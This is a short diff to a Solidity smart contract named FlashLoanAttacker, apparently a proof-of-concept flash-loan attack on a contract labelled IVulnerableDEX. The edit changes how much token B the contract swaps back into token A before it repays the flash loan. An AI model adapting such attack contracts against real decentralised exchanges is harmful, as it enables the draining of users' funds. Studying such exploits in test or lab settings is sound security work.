@@ -58,7 +58,8 @@ contract FlashLoanAttacker {
 
         uint256 bReceived = IVulnerableDEX(dex).swapAForB(amount);
 
-        uint256 aRecovered = IVulnerableDEX(dex).swapBForA(bReceived / 2);
+        uint256 bToSwapBack = (bReceived * 9) / 10;
+        IVulnerableDEX(dex).swapBForA(bToSwapBack);
 
         require(
             tokenA.balanceOf(address(this)) >= amount,
@@ -67,6 +68,7 @@ contract FlashLoanAttacker {
 
         tokenA.transfer(address(flashLoanProvider), amount);
     }
+
 
 
 
